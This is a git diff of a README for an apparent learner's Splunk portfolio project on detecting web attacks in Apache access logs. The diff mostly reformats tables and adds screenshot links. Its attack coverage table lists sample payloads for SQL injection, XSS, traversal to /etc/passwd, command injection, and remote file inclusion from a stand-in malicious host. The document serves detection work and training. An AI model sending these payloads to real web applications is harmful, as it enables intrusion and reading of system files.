@@ -38,27 +38,29 @@ This project simulates a real-world Security Operations Center (SOC) engagement 
 
 ## Environment
 
-| Component       | Details                              |
-|-----------------|--------------------------------------|
-| SIEM Platform   | Splunk Enterprise 10.2.3             |
+| Component        | Details                             |
+|------------------|-------------------------------------|
+| SIEM Platform    | Splunk Enterprise 10.2.3            |
 | Operating System | Windows                             |
-| Data Source     | `access_log.txt`                     |
-| Sourcetype      | `access_combined`                    |
-| Index           | `main`                               |
-| Log Type        | Web Server Access Logs (Apache CLF)  |
+| Data Source      | `access_log.txt`                    |
+| Sourcetype       | `access_combined`                   |
+| Index            | `main`                              |
+| Log Type         | Web Server Access Logs (Apache CLF) |
+
+![Splunk Overview](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/splunk_overview.png)
 
 ---
 
 ## Attack Coverage
 
-| Attack Type                      | Example Payload                                    | Risk Level  |
-|----------------------------------|----------------------------------------------------|-------------|
-| SQL Injection (SQLi)             | `/search?query=' OR '1'='1`                        | 🔴 Critical |
-| Cross-Site Scripting (XSS)       | `/profile.php?name=<script>alert('XSS')</script>` | 🟠 High     |
-| Directory Traversal / LFI        | `/download?file=../../../../etc/passwd`            | 🔴 Critical |
-| Command Injection / RCE          | `/exec.php?cmd=whoami;id;ls -la`                   | 🔴 Critical |
-| Remote File Inclusion (RFI)      | `/page.php?url=http://malicious.com/shell.txt`     | 🔴 Critical |
-| Reconnaissance / Automated Scan  | Nmap Scripting Engine, sqlmap                      | 🟡 Medium   |
+| Attack Type                     | Example Payload                                     | Risk Level  |
+|---------------------------------|-----------------------------------------------------|-------------|
+| SQL Injection (SQLi)            | `/search?query=' OR '1'='1`                         | 🔴 Critical |
+| Cross-Site Scripting (XSS)      | `/profile.php?name=<script>alert('XSS')</script>`  | 🟠 High     |
+| Directory Traversal / LFI       | `/download?file=../../../../etc/passwd`             | 🔴 Critical |
+| Command Injection / RCE         | `/exec.php?cmd=whoami;id;ls -la`                    | 🔴 Critical |
+| Remote File Inclusion (RFI)     | `/page.php?url=http://malicious.com/shell.txt`      | 🔴 Critical |
+| Reconnaissance / Automated Scan | Nmap Scripting Engine, sqlmap                       | 🟡 Medium   |
 
 ---
 
@@ -75,6 +77,10 @@ HTTP 200 returned for a command injection payload — indicates the target appli
 - Internal IP `10.0.0.5` exhibited suspicious command injection activity (insider threat or lateral movement)
 - `sqlmap` and `Nmap` user-agents confirm tooling-assisted exploitation attempts
 
+![Statistics View](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/statistics_view.png)
+
+![Pattern Analysis](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/pattern_analysis.png)
+
 ---
 
 ## Detection Logic
@@ -87,6 +93,8 @@ The core SPL query is in [`queries/web_attack_detection.spl`](queries/web_attack
 3. Classify each event into an attack category via `eval/case`
 4. Aggregate by `src_ip` and `attack_type` for triage
 
+![Detection Query Results](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/detection_query_results.png)
+
 **Index validation query** (used during SIEM troubleshooting):
 ```spl
 index=* | stats count by index sourcetype source host
@@ -98,12 +106,12 @@ index=* | stats count by index sourcetype source host
 
 ### Suspicious IP Addresses
 
-| IP Address        | Activity                         |
-|-------------------|----------------------------------|
-| `185.199.110.153` | Command Injection / RFI / LFI   |
-| `37.49.226.150`   | SQL Injection / Recon            |
-| `192.168.1.101`   | SQLi / XSS / LFI                 |
-| `10.0.0.5`        | Internal — Command Injection     |
+| IP Address        | Activity                        |
+|-------------------|---------------------------------|
+| `185.199.110.153` | Command Injection / RFI / LFI  |
+| `37.49.226.150`   | SQL Injection / Recon           |
+| `192.168.1.101`   | SQLi / XSS / LFI                |
+| `10.0.0.5`        | Internal — Command Injection    |
 
 ### Suspicious User Agents
 - `sqlmap/1.4.5-dev`
@@ -115,15 +123,19 @@ Full IOC reference → [`iocs/indicators.md`](iocs/indicators.md)
 
 ## Alert Configuration
 
-| Parameter       | Value                              |
-|-----------------|------------------------------------|
-| Alert Name      | Critical Web Application Attack Detection |
-| Alert Type      | Scheduled                          |
-| Schedule        | Every 1 minute                     |
-| Search Window   | Last 5 minutes                     |
-| Trigger         | Number of Results > 0              |
-| Severity        | High / Critical                    |
+| Parameter     | Value                                     |
+|---------------|-------------------------------------------|
+| Alert Name    | Critical Web Application Attack Detection |
+| Alert Type    | Scheduled                                 |
+| Schedule      | Every 1 minute                            |
+| Search Window | Last 5 minutes                            |
+| Trigger       | Number of Results > 0                     |
+| Severity      | High / Critical                           |
+
 ![Alert Creation](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/alert_creation.png)
+
+![Triggered Alerts](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/triggered_alerts.png)
+
 ---
 
 ## Repository Structure
@@ -139,8 +151,10 @@ splunk-web-attack-detection/
 ├── iocs/
 │   └── indicators.md            # IP addresses, user agents, payloads
 └── screenshots/                 # Evidence: query results, alert config
+    ├── splunk_overview.png
     ├── detection_query_results.png
     ├── statistics_view.png
+    ├── pattern_analysis.png
     ├── alert_creation.png
     └── triggered_alerts.png
 ```
@@ -149,15 +163,15 @@ splunk-web-attack-detection/
 
 ## Skills Demonstrated
 
-| Domain                    | Specifics                                          |
-|---------------------------|----------------------------------------------------|
-| SIEM Operations           | Splunk log ingestion, index validation, troubleshooting |
-| Detection Engineering     | SPL query development, regex extraction, eval logic |
-| Threat Hunting            | Pattern analysis, behavioral clustering            |
-| IOC Analysis              | IP attribution, user-agent fingerprinting          |
-| Alert Development         | Scheduled alerts, trigger thresholds               |
-| Incident Response         | RCE triage, escalation criteria, HTTP status analysis |
-| Web Attack Analysis       | SQLi, XSS, LFI, RFI, RCE, Recon                   |
+| Domain                 | Specifics                                               |
+|------------------------|---------------------------------------------------------|
+| SIEM Operations        | Splunk log ingestion, index validation, troubleshooting |
+| Detection Engineering  | SPL query development, regex extraction, eval logic     |
+| Threat Hunting         | Pattern analysis, behavioral clustering                 |
+| IOC Analysis           | IP attribution, user-agent fingerprinting               |
+| Alert Development      | Scheduled alerts, trigger thresholds                    |
+| Incident Response      | RCE triage, escalation criteria, HTTP status analysis   |
+| Web Attack Analysis    | SQLi, XSS, LFI, RFI, RCE, Recon                        |
 
 ---
 
@@ -168,4 +182,4 @@ splunk-web-attack-detection/
 
 ---
 
-*Prepared by **Dunsin Fakorede** | SOC Analyst / Cybersecurity Learner*
+*Prepared by **Dunsin Fakorede** | SOC Analyst / Cybersecurity Enthusiast*
